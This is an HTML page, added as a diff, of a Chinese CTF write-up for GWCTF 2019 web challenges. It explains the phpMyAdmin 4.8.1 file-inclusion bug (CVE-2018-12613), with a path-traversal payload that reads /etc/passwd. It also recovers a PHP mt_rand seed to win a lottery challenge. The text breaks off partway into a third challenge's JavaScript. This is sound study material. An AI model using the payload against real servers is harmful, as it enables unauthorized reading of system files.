@@ -1,0 +1,634 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+<meta name="google-site-verification" content="eFIczS6pLawspui5Sm7JUbsaANiKGnqjmDod70iSzI4" />
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"yq1ng.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="[GWCTF 2019]我有一个数据库  - [[漏洞原理](https:&#x2F;&#x2F;blog.csdn.net&#x2F;loseheart157&#x2F;article&#x2F;details&#x2F;109345635)](#漏洞原理httpsblogcsdnnetloseheart157articledetails109345635)  [GWCTF 2019]枯燥的抽奖 [GWCTF 2019]mypassword [GW">
+<meta property="og:type" content="article">
+<meta property="og:title" content="GWCTF2019 web wp">
+<meta property="og:url" content="http://yq1ng.github.io/z_post/GWCTF2019/index.html">
+<meta property="og:site_name" content="会下雪的晴天">
+<meta property="og:description" content="[GWCTF 2019]我有一个数据库  - [[漏洞原理](https:&#x2F;&#x2F;blog.csdn.net&#x2F;loseheart157&#x2F;article&#x2F;details&#x2F;109345635)](#漏洞原理httpsblogcsdnnetloseheart157articledetails109345635)  [GWCTF 2019]枯燥的抽奖 [GWCTF 2019]mypassword [GW">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/yq1ng/blog/master/GWCTF%202019/image.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yq1ng/blog/master/GWCTF%202019/image.yltcaxpg3gh.png">
+<meta property="article:published_time" content="2020-11-15T01:04:08.000Z">
+<meta property="article:modified_time" content="2020-11-17T09:27:40.344Z">
+<meta property="article:author" content="yq1ng">
+<meta property="article:tag" content="CTF WEB">
+<meta property="article:tag" content="...">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/yq1ng/blog/master/GWCTF%202019/image.png">
+
+<link rel="canonical" href="http://yq1ng.github.io/z_post/GWCTF2019/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>GWCTF2019 web wp | 会下雪的晴天</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">会下雪的晴天</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">CTF菜鸡</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yq1ng.github.io/z_post/GWCTF2019/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/xiaoxin.jpg">
+      <meta itemprop="name" content="yq1ng">
+      <meta itemprop="description" content="The best way to know your strength is to fight">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="会下雪的晴天">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          GWCTF2019 web wp
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-11-15 09:04:08" itemprop="dateCreated datePublished" datetime="2020-11-15T09:04:08+08:00">2020-11-15</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-11-17 17:27:40" itemprop="dateModified" datetime="2020-11-17T17:27:40+08:00">2020-11-17</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/" itemprop="url" rel="index"><span itemprop="name">CTF做题记录</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>10k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>17 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <!-- TOC -->
+
+<ul>
+<li><a href="#gwctf-2019%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93">[GWCTF 2019]我有一个数据库</a><pre><code>  - [[漏洞原理](https://blog.csdn.net/loseheart157/article/details/109345635)](#漏洞原理httpsblogcsdnnetloseheart157articledetails109345635)</code></pre>
+</li>
+<li><a href="#gwctf-2019%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96">[GWCTF 2019]枯燥的抽奖</a></li>
+<li><a href="#gwctf-2019mypassword">[GWCTF 2019]mypassword</a></li>
+<li><a href="#gwctf-2019%E4%BD%A0%E7%9A%84%E5%90%8D%E5%AD%97">[GWCTF 2019]你的名字</a></li>
+<li><a href="#gwctf-2019blog">[GWCTF 2019]blog</a></li>
+</ul>
+<!-- /TOC -->
+
+<a id="more"></a>
+<h1 id="GWCTF-2019-我有一个数据库"><a href="#GWCTF-2019-我有一个数据库" class="headerlink" title="[GWCTF 2019]我有一个数据库"></a>[GWCTF 2019]我有一个数据库</h1><p>遍扫描遍看wp，看到大佬直接盲猜<code>/phpmyadmin</code>我也就不扫了哈哈哈，记下来<br>看一下版本，phpMyadmin 版本信息： 4.8.1，最新稳定版本： 4.9.7，既然版本更新了，那说明老版本很可能有漏洞鸭，Google一波<br>phpmyadmin 4.8.1 远程文件包含漏洞（<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/44928">CVE-2018-12613</a>），payload：<code>?target=db_datadict.php%253f/../../../../../../../../etc/passwd</code>，直接一把梭了\</p>
+<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a><a target="_blank" rel="noopener" href="https://blog.csdn.net/loseheart157/article/details/109345635">漏洞原理</a></h3><p>跟着大佬的博客复现了一遍，先看phpMyAdmin 4.8.1版本的index.php文件的第50-63行代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$target_blacklist = <span class="keyword">array</span> (</span><br><span class="line">    <span class="string">&#x27;import.php&#x27;</span>, <span class="string">&#x27;export.php&#x27;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// If we have a valid target, let&#x27;s load that script instead</span></span><br><span class="line"><span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">&#x27;target&#x27;</span>])<span class="comment">//target不能为空</span></span><br><span class="line">    &amp;&amp; is_string($_REQUEST[<span class="string">&#x27;target&#x27;</span>])<span class="comment">//必须为字符串</span></span><br><span class="line">    &amp;&amp; ! preg_match(<span class="string">&#x27;/^index/&#x27;</span>, $_REQUEST[<span class="string">&#x27;target&#x27;</span>])<span class="comment">//开头不能为index</span></span><br><span class="line">    &amp;&amp; ! in_array($_REQUEST[<span class="string">&#x27;target&#x27;</span>], $target_blacklist)<span class="comment">//不能存在黑名单的内容</span></span><br><span class="line">    &amp;&amp; Core::checkPageValidity($_REQUEST[<span class="string">&#x27;target&#x27;</span>])<span class="comment">//经过checkPageValidity()检查</span></span><br><span class="line">) &#123;</span><br><span class="line">    <span class="keyword">include</span> $_REQUEST[<span class="string">&#x27;target&#x27;</span>];</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>再看看<code>checkPageValidity()</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkPageValidity</span>(<span class="params">&amp;$page, <span class="keyword">array</span> $whitelist = []</span>)//<span class="title">target</span>与两个形参</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($whitelist)) &#123;<span class="comment">//检查其是否为空</span></span><br><span class="line">        $whitelist = <span class="built_in">self</span>::$goto_whitelist;<span class="comment">//为空则用self::$goto_whitelist为其赋值</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;<span class="comment">//判断target</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;<span class="comment">//检查是否在白名单</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $_page = mb_substr(<span class="comment">//获取部分字符串</span></span><br><span class="line">        $page,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        mb_strpos($page . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)<span class="comment">//查找字符串在另一个字符串中首次出现的位置</span></span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;<span class="comment">//截取后的target是否还存在白名单中</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $_page = urldecode($page);<span class="comment">//url解码</span></span><br><span class="line">    $_page = mb_substr(</span><br><span class="line">        $_page,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        mb_strpos($_page . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">    );<span class="comment">//继续截取？前的字符串</span></span><br><span class="line">    <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;<span class="comment">//再次检查</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>看一下<code>self::$goto_whitelist</code>白名单的内容</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> $goto_whitelist = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;db_datadict.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_sql.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_events.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_export.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_importdocsql.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_multi_table_query.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_structure.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_import.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_operations.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_search.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_routines.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;export.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;import.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;index.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;pdf_pages.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;pdf_schema.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_binlog.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_collations.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_databases.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_engines.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_export.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_import.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_privileges.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_sql.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_status.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_status_advisor.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_status_monitor.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_status_queries.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_status_variables.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_variables.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;sql.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_addfield.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_change.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_create.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_import.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_indexes.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_sql.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_export.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_operations.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_structure.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_relation.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_replace.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_row_action.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_select.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_zoom_select.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;transformation_overview.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;transformation_wrapper.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;user_password.php&#x27;</span>,</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+<p>那么payload就好解释了，<code>?target=db_datadict.php%253f/../../../../../../../../flag</code>中的<code>%253f</code>解码一次后为<code>%3f</code>这是由php的<code>$_REQUEST[&#39;target&#39;]</code>解释的，绕过第一次白名单检测，然后再此url解码，白名单还是会返回true造成任意文件读取</p>
+<h1 id="GWCTF-2019-枯燥的抽奖"><a href="#GWCTF-2019-枯燥的抽奖" class="headerlink" title="[GWCTF 2019]枯燥的抽奖"></a>[GWCTF 2019]枯燥的抽奖</h1><blockquote>
+<p>这题和MRCTF2020的<a href="https://yq1ng.github.io/z_post/MRCTF2020-%E5%A5%97%E9%A4%90/#mrctf2020ezaudit">Ezaudit</a>很像，都是考察了伪随机数运用<br>官方wp：<a target="_blank" rel="noopener" href="https://github.com/gwht/2019GWCTF/tree/master/wp/web/%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96">https://github.com/gwht/2019GWCTF/tree/master/wp/web/%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96</a></p>
+</blockquote>
+<p>看js，跟踪到<code>check.php</code>，得到源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#这不是抽奖程序的源代码！不许看！</span></span><br><span class="line">header(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">&#x27;seed&#x27;</span>]))&#123;</span><br><span class="line">    $_SESSION[<span class="string">&#x27;seed&#x27;</span>]=rand(<span class="number">0</span>,<span class="number">999999999</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mt_srand($_SESSION[<span class="string">&#x27;seed&#x27;</span>]);<span class="comment">//mt_srand()为mt_rand分发种子，但是$_SESSION[&#x27;seed&#x27;]似乎不是随机的，所以可以根据种子序列爆破出种子</span></span><br><span class="line">$str_long1 = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line">$str=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">$len1=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $len1; $i++ )&#123;</span><br><span class="line">    $str.=substr($str_long1, mt_rand(<span class="number">0</span>, strlen($str_long1) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">$str_show = substr($str, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p id=&#x27;p1&#x27;&gt;&quot;</span>.$str_show.<span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>($_POST[<span class="string">&#x27;num&#x27;</span>]===$str)&#123;x</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="string">&quot;check.php&quot;</span>);</span><br></pre></td></tr></table></figure>
+<p>爆破种子脚本<a target="_blank" rel="noopener" href="http://www.openwall.com/php_mt_seed/">在此</a><br>先用脚本得到序列</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">str1=<span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class="line">str2=<span class="string">&#x27;yTPhFFRT7B&#x27;</span></span><br><span class="line">str3 = str1[::<span class="number">-1</span>]</span><br><span class="line">length = len(str2)</span><br><span class="line">res=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(str2)):  </span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(len(str1)):</span><br><span class="line">        <span class="keyword">if</span> str2[i] == str1[j]:</span><br><span class="line">            res+=str(j)+<span class="string">&#x27; &#x27;</span>+str(j)+<span class="string">&#x27; &#x27;</span>+<span class="string">&#x27;0&#x27;</span>+<span class="string">&#x27; &#x27;</span>+str(len(str1)<span class="number">-1</span>)+<span class="string">&#x27; &#x27;</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure>
+<p>得到序列：<code>46 46 0 61 40 40 0 61 9 9 0 61 41 41 0 61 26 26 0 61 55 55 0 61 42 42 0 61 10 10 0 61 49 49 0 61 40 40 0 61</code>，丢到<a target="_blank" rel="noopener" href="https://www.openwall.com/php_mt_seed/php_mt_seed-4.0.tar.gz">php_mt_seed</a>跑一下<br><img src="https://raw.githubusercontent.com/yq1ng/blog/master/GWCTF%202019/image.png" alt="php_mt_seed"><br>注意php版本，下面的脚本需要对应的php版本才能运行成功</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mt_srand(<span class="number">272865584</span>);</span><br><span class="line">$str_long1 = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line">$str=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">$len1=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $len1; $i++ )&#123;</span><br><span class="line">    $str.=substr($str_long1, mt_rand(<span class="number">0</span>, strlen($str_long1) - <span class="number">1</span>), <span class="number">1</span>);       </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p id=&#x27;p1&#x27;&gt;&quot;</span>.$str.<span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br></pre></td></tr></table></figure>
+<p>提交字符串，done</p>
+<h1 id="GWCTF-2019-mypassword"><a href="#GWCTF-2019-mypassword" class="headerlink" title="[GWCTF 2019]mypassword"></a>[GWCTF 2019]mypassword</h1><p>顺手看了看源码，在/js/login.js下发现</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">document</span>.cookie &amp;&amp; <span class="built_in">document</span>.cookie != <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">	<span class="keyword">var</span> cookies = <span class="built_in">document</span>.cookie.split(<span class="string">&#x27;; &#x27;</span>);</span><br><span class="line">	<span class="keyword">var</span> cookie = &#123;&#125;;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; cookies.length; i++) &#123;</span><br><span class="line">		<span class="keyword">var</span> 